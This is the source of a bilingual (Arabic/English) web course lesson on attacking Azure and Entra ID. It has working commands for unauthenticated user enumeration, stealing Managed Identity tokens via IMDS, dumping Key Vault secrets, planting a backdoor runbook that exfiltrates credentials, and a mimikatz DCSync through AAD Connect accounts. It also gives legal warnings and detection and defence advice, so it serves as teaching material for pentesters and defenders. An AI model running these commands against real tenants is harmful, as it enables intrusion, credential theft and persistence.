"use client";
import { LessonShell, Section, Callout, Code, Terminal, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="azure-attacks">
      <L
        ar={<>
          <Section title="ليه Azure مختلف عن AWS و GCP؟">
            <p>Azure مدمج بعمق مع <b>Entra ID</b> (هوية اليوزرز) ومع <b>Active Directory</b> الكلاسيكي. الاختراق هنا بيقفز بين الطبقات: من حساب M365 → لـ Subscription → لـ VM → لـ on-prem AD. الجسور دي هي اللي بتخلي Azure هدف ذهبي للـ state actors.</p>
            <Analogy>تخيل مدينتين جنب بعض، بينهم جسور كتير. كل جسر له حارس مختلف، وأغلب الجسور دي محدش بناها بقصد — اتولدت من اتفاقيات قديمة. المهاجم بيدور على أضعف جسر، مش أقصر طريق.</Analogy>
            <Callout kind="danger" title="تنبيه قانوني">
              كل اللي هنا للتطبيق في بيئاتك الخاصة أو ضمن نطاق Pentest معاك فيه إذن. مهاجمة subscription مش بتاعتك = جريمة فيدرالية في أغلب الدول.
            </Callout>
          </Section>

          <Section title="نموذج الصلاحيات — RBAC + Entra Roles">
            <TwoCol>
              <Card title="Azure RBAC" color="blue">
                صلاحيات على <b>الموارد</b> (VMs, Storage, KeyVault). بتتمنح على Scope: Management Group → Subscription → Resource Group → Resource.
              </Card>
              <Card title="Entra (AAD) Roles" color="amber">
                صلاحيات على <b>الهوية</b> (User Admin, Global Admin). منفصلة عن RBAC — الـ Global Admin <b>مش بيشوف</b> الـ Subscriptions أوتوماتيك (بس يقدر يرفع نفسه عبر "Access management for Azure resources").
              </Card>
            </TwoCol>
            <Callout kind="info" title="نقطة الضعف الكلاسيكية">
              Global Admin → فعّل "User Access Administrator at root" → Owner على كل Subscription. كليكتين بس بين تسريب MFA والسيطرة الكاملة.
            </Callout>
          </Section>

          <Section title="الاستطلاع — معلومات عن الـ Tenant من غير اعتماد">
            <Terminal lines={[
              { p: "# هل النطاق tenant Azure؟ معرفة tenant ID:" },
              { p: "curl -s 'https://login.microsoftonline.com/target.gov/.well-known/openid-configuration' | jq .issuer" },
              { p: "" },
              { p: "# تعداد المستخدمين دون اعتماد (UserEnumerationTimingAttack)" },
              { p: "AADInternals> Invoke-AADIntUserEnumerationAsOutsider -UserName 'admin@target.gov'" },
              { o: "UserName            Exists\nadmin@target.gov    True" },
              { p: "" },
              { p: "# قائمة domains المربوطة بنفس tenant" },
              { p: "Get-AADIntTenantDomains -Domain target.gov" },
            ]} />
          </Section>

          <Section title="Managed Identity — جوهرة المهاجم">
            <p>لما تشغّل VM أو Function App في Azure، تقدر تديها <b>Managed Identity</b> — هوية أوتوماتيك معاها صلاحيات على موارد تانية. الفايدة: مفيش باسوردات. المشكلة: أي حد يخترق الـ VM، بقا هو نفسه الـ identity في ثانية.</p>
            <Terminal lines={[
              { p: "# من داخل VM مخترقة — اطلب token من IMDS" },
              { p: "curl -s -H 'Metadata: true' \\\n  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'" },
              { o: "{\"access_token\":\"eyJ0eXA...\",\"expires_in\":\"86399\",\"resource\":\"https://management.azure.com/\"}" },
              { p: "" },
              { p: "# استخدمه عبر az CLI" },
              { p: "export AZ_TOKEN=eyJ0eXA..." },
              { p: "az rest --method get --uri 'https://management.azure.com/subscriptions?api-version=2020-01-01' --headers \"Authorization=Bearer $AZ_TOKEN\"" },
            ]} />
            <Callout kind="info" title="الجواهر اللي تطلبها">
              اطلب token لـ <span className="eng">https://vault.azure.net</span> واقرا Key Vault. أو لـ <span className="eng">https://storage.azure.com</span> ونزّل الـ blobs. أو لـ <span className="eng">https://graph.microsoft.com</span> واقرا الـ Tenant كله.
            </Callout>
          </Section>

          <Section title="Storage Accounts — أكبر مصدر للتسريب">
            <ul>
              <li><b>Public containers</b> — زي S3 buckets، بس أصعب في الاكتشاف (الـ DNS مش بيتحرث بسهولة).</li>
              <li><b>SAS Tokens</b> — مفاتيح مؤقتة. بتلاقيها في كود JavaScript على الـ frontend، Postman، commits على GitHub.</li>
              <li><b>Storage Account Keys</b> — مفتاحين أبديين لكل حساب. اللي معاه واحد منهم = SYSTEM على الداتا.</li>
            </ul>
            <Terminal lines={[
              { p: "# تخمين أسماء حسابات تخزين عامة" },
              { p: "for name in target targetbackup targetdev targetprod; do" },
              { p: "  curl -sI \"https://${name}.blob.core.windows.net/?comp=list\" | head -1" },
              { p: "done" },
              { o: "HTTP/1.1 200 OK    # موجود!\nHTTP/1.1 400 Bad Request" },
              { p: "" },
              { p: "# Microburst لاكتشاف أسرع" },
              { p: "Invoke-EnumerateAzureBlobs -Base 'target' -Permutations all" },
            ]} />
          </Section>

          <Section title="Key Vault — صندوق الأسرار الذهبي">
            <p>Key Vault بيحتوي certificates وsecrets وkeys. الهجوم مش بيكسر التشفير — بيكسر <b>سياسة الوصول</b>.</p>
            <Code lang="bash">{`# كل من له get/list secrets يستطيع تنزيل كل شيء
az keyvault secret list --vault-name target-kv --query '[].name' -o tsv \\
  | while read name; do
      echo "=== $name ==="
      az keyvault secret show --vault-name target-kv --name "$name" --query value -o tsv
    done

# Soft-delete لا يحميك — يمكن استعادة secret محذوف لمدة 90 يوماً
az keyvault secret list-deleted --vault-name target-kv`}</Code>
            <Callout kind="good" title="الدفاع">
              فعّل <b>Purge Protection</b> (مفيش رجوع)، استخدم RBAC mode بدل Access Policies (أدق)، Private Endpoint، وراقب <span className="eng">SecretGet</span> events في Defender.
            </Callout>
          </Section>

          <Section title="Automation Accounts والـ Runbooks">
            <p>الـ Runbook = سكريبت PowerShell بيشتغل بصلاحيات Run-As Account (غالباً Contributor على الـ Subscription). أي حد يقدر يعدل عليه، بقى Contributor.</p>
            <Terminal lines={[
              { p: "# إذا لديك Contributor على Automation Account:" },
              { p: "az automation runbook create --resource-group rg --automation-account-name auto1 \\\n  --name backdoor --type PowerShell" },
              { p: "az automation runbook replace-content --resource-group rg --automation-account-name auto1 \\\n  --name backdoor --content @evil.ps1" },
              { p: "az automation runbook publish ..." },
              { p: "az automation runbook start ...   # يعمل بصلاحيات Run-As Identity" },
            ]} />
            <p>الـ <span className="eng">evil.ps1</span> ممكن ينشئ Service Principal بصلاحيات Owner ويبعت الـ credentials بره البيئة.</p>
          </Section>

          <Section title="القفز للـ on-prem — عن طريق Azure AD Connect">
            <p>الـ server اللي بيشغل <b>Azure AD Connect</b> فيه حسابين خدمة، الاتنين قاتلين:</p>
            <ul>
              <li><span className="eng">MSOL_*</span> — معاه صلاحية <b>DCSync</b> على on-prem AD. اللي يكسر هاش الحساب ده، بيقرا كل الباسوردات في الدومين.</li>
              <li><span className="eng">Sync_*</span> — معاه صلاحية على Entra للمزامنة. كفاية إنه يعمل reset لباسورد Global Admin مش "cloud-only".</li>
            </ul>
            <Code lang="powershell">{`# على خادم AAD Connect — استخراج credentials
adconnectdump.exe   # أو AADInternals: Get-AADIntSyncCredentials

# ثم DCSync بحساب MSOL_ من أي مكان داخل الشبكة
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator /authuser:MSOL_xxx /authpassword:xxx`}</Code>
          </Section>

          <Section title="الكشف والدفاع">
            <Callout kind="good" title="اللي لازم الـ Blue Team يشوفه">
              <ul>
                <li><b>Sign-in Logs</b> — أدمن بيدخل من IP غريب. UEBA risk score &gt; 70 = جرس إنذار.</li>
                <li><b>Audit Logs</b> — إضافة credential على Service Principal، تعديل Conditional Access policies، رفع role.</li>
                <li><b>Activity Log</b> — على الـ Subscription: <span className="eng">Microsoft.Authorization/roleAssignments/write</span>، <span className="eng">Microsoft.KeyVault/vaults/secrets/getSecret</span> من principal مش معتاد.</li>
                <li><b>Defender for Cloud</b> — بيكشف Managed Identity token abuse وIMDS من شبكة مش معتادة.</li>
              </ul>
            </Callout>
            <ul>
              <li>طبّق <b>Conditional Access</b> على كل دور إداري — MFA قوي + Trusted Locations + Compliant Device.</li>
              <li>استخدم <b>Privileged Identity Management (PIM)</b> — أدوار Just-In-Time مع تفعيل وموافقة.</li>
              <li>اعزل <b>Break-Glass accounts</b> (اتنين على الأقل) بره الـ Conditional Access، وحط تنبيه على كل استخدام.</li>
              <li>راجع الـ Service Principals كل أسبوع — كتير منهم بينسى ومعاه credentials مالهاش انتهاء.</li>
            </ul>
            <Callout kind="info" title="أدوات الـ Red Team">
              <span className="eng">AADInternals, ROADtools, MicroBurst, AzureHound, Stormspotter, MSOLSpray, TokenTactics</span>.
            </Callout>
          </Section>
        </>}
        en={<>
          <Section title="Why Azure is different from AWS & GCP">
            <p>Azure is deeply fused with <b>Entra ID</b> (identity) and classic <b>Active Directory</b>. Compromise jumps between layers: M365 account → Subscription → VM → on-prem AD. These bridges are what make Azure a prime target for state actors.</p>
            <Analogy>Two adjacent cities with many bridges between them. Each bridge has its own guard, and many were never deliberately built — they grew from old agreements. The attacker hunts the weakest bridge, not the shortest path.</Analogy>
            <Callout kind="danger" title="Legal warning">
              Everything here is for your own labs or an authorized pentest scope. Attacking a subscription you don't own is a federal crime in most jurisdictions.
            </Callout>
          </Section>

          <Section title="Permission model — RBAC + Entra Roles">
            <TwoCol>
              <Card title="Azure RBAC" color="blue">
                Permissions on <b>resources</b> (VMs, Storage, KeyVault). Granted at scope: Management Group → Subscription → Resource Group → Resource.
              </Card>
              <Card title="Entra (AAD) Roles" color="amber">
                Permissions on <b>identity</b> (User Admin, Global Admin). Separate from RBAC — Global Admin <b>doesn't</b> see Subscriptions by default (but can elevate via "Access management for Azure resources").
              </Card>
            </TwoCol>
            <Callout kind="info" title="Classic weakness">
              Global Admin → toggle "User Access Administrator at root" → Owner on every Subscription. Two clicks from MFA-stolen credential to full estate control.
            </Callout>
          </Section>

          <Section title="Recon — Tenant info without auth">
            <Terminal lines={[
              { p: "# Is the domain Azure? Tenant ID:" },
              { p: "curl -s 'https://login.microsoftonline.com/target.gov/.well-known/openid-configuration' | jq .issuer" },
              { p: "" },
              { p: "# User enumeration without creds (timing-based)" },
              { p: "AADInternals> Invoke-AADIntUserEnumerationAsOutsider -UserName 'admin@target.gov'" },
              { o: "UserName            Exists\nadmin@target.gov    True" },
              { p: "" },
              { p: "# All domains tied to the same tenant" },
              { p: "Get-AADIntTenantDomains -Domain target.gov" },
            ]} />
          </Section>

          <Section title="Managed Identity — the attacker's jewel">
            <p>VMs and Function Apps can carry a <b>Managed Identity</b> — an automatic identity with permissions on other resources. Upside: no passwords. Downside: whoever pops the VM becomes that identity instantly.</p>
            <Terminal lines={[
              { p: "# From a compromised VM — request token from IMDS" },
              { p: "curl -s -H 'Metadata: true' \\\n  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'" },
              { o: "{\"access_token\":\"eyJ0eXA...\",\"expires_in\":\"86399\",\"resource\":\"https://management.azure.com/\"}" },
              { p: "" },
              { p: "# Use it via az CLI" },
              { p: "export AZ_TOKEN=eyJ0eXA..." },
              { p: "az rest --method get --uri 'https://management.azure.com/subscriptions?api-version=2020-01-01' --headers \"Authorization=Bearer $AZ_TOKEN\"" },
            ]} />
            <Callout kind="info" title="Crown jewels">
              Request a token for <span className="eng">https://vault.azure.net</span> and read Key Vault. Or <span className="eng">https://storage.azure.com</span> and dump blobs. Or <span className="eng">https://graph.microsoft.com</span> and enumerate the tenant.
            </Callout>
          </Section>

          <Section title="Storage Accounts — biggest leak source">
            <ul>
              <li><b>Public containers</b> — like S3 buckets, but harder to scrape (DNS isn't trivially crawled).</li>
              <li><b>SAS Tokens</b> — temporary keys. Show up in frontend JS, Postman, GitHub commits.</li>
              <li><b>Storage Account Keys</b> — two everlasting keys per account. Whoever owns one = SYSTEM on the data.</li>
            </ul>
            <Terminal lines={[
              { p: "# Guess public storage account names" },
              { p: "for name in target targetbackup targetdev targetprod; do" },
              { p: "  curl -sI \"https://${name}.blob.core.windows.net/?comp=list\" | head -1" },
              { p: "done" },
              { o: "HTTP/1.1 200 OK    # exists!\nHTTP/1.1 400 Bad Request" },
              { p: "" },
              { p: "# Microburst for fast discovery" },
              { p: "Invoke-EnumerateAzureBlobs -Base 'target' -Permutations all" },
            ]} />
          </Section>

          <Section title="Key Vault — the secrets goldbox">
            <p>Key Vault holds certs, secrets, keys. The attack doesn't break crypto — it breaks the <b>access policy</b>.</p>
            <Code lang="bash">{`# Anyone with get/list secrets can dump everything
az keyvault secret list --vault-name target-kv --query '[].name' -o tsv \\
  | while read name; do
      echo "=== $name ==="
      az keyvault secret show --vault-name target-kv --name "$name" --query value -o tsv
    done

# Soft-delete doesn't save you — deleted secrets recoverable 90 days
az keyvault secret list-deleted --vault-name target-kv`}</Code>
            <Callout kind="good" title="Defense">
              Enable <b>Purge Protection</b> (irreversible), use RBAC mode (not Access Policies), Private Endpoint, and watch <span className="eng">SecretGet</span> events in Defender.
            </Callout>
          </Section>

          <Section title="Automation Accounts & Runbooks">
            <p>A Runbook is a PowerShell script running as a Run-As Account (often Contributor on the Subscription). Whoever can edit it becomes Contributor.</p>
            <Terminal lines={[
              { p: "# If you have Contributor on the Automation Account:" },
              { p: "az automation runbook create --resource-group rg --automation-account-name auto1 \\\n  --name backdoor --type PowerShell" },
              { p: "az automation runbook replace-content --resource-group rg --automation-account-name auto1 \\\n  --name backdoor --content @evil.ps1" },
              { p: "az automation runbook publish ..." },
              { p: "az automation runbook start ...   # runs as Run-As identity" },
            ]} />
            <p>The <span className="eng">evil.ps1</span> can mint an Owner Service Principal and exfil credentials.</p>
          </Section>

          <Section title="Pivoting on-prem — Azure AD Connect">
            <p>The server running <b>Azure AD Connect</b> holds two service accounts, both lethal:</p>
            <ul>
              <li><span className="eng">MSOL_*</span> — has <b>DCSync</b> rights on on-prem AD. Crack this hash and you read every password in the domain.</li>
              <li><span className="eng">Sync_*</span> — Entra-side sync rights. Enough to reset a non-cloud-only Global Admin's password.</li>
            </ul>
            <Code lang="powershell">{`# On the AAD Connect server — extract creds
adconnectdump.exe   # or AADInternals: Get-AADIntSyncCredentials

# Then DCSync as MSOL_ from anywhere on the network
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator /authuser:MSOL_xxx /authpassword:xxx`}</Code>
          </Section>

          <Section title="Detection & defense">
            <Callout kind="good" title="What Blue Team must see">
              <ul>
                <li><b>Sign-in Logs</b> — admin login from unfamiliar IP. UEBA risk score &gt; 70.</li>
                <li><b>Audit Logs</b> — credential added to a Service Principal, Conditional Access policy edits, role elevations.</li>
                <li><b>Activity Log</b> — at subscription: <span className="eng">Microsoft.Authorization/roleAssignments/write</span>, <span className="eng">Microsoft.KeyVault/vaults/secrets/getSecret</span> from unusual principals.</li>
                <li><b>Defender for Cloud</b> — flags Managed Identity token abuse and IMDS access from unusual networks.</li>
              </ul>
            </Callout>
            <ul>
              <li>Apply <b>Conditional Access</b> to every admin role — MFA + Trusted Locations + Compliant Device.</li>
              <li>Use <b>Privileged Identity Management (PIM)</b> — JIT roles with activation + approval.</li>
              <li>Keep <b>Break-Glass accounts</b> (≥ 2) outside Conditional Access, alert on every use.</li>
              <li>Review Service Principals weekly — many forgotten with non-expiring credentials.</li>
            </ul>
            <Callout kind="info" title="Red team toolkit">
              <span className="eng">AADInternals, ROADtools, MicroBurst, AzureHound, Stormspotter, MSOLSpray, TokenTactics</span>.
            </Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
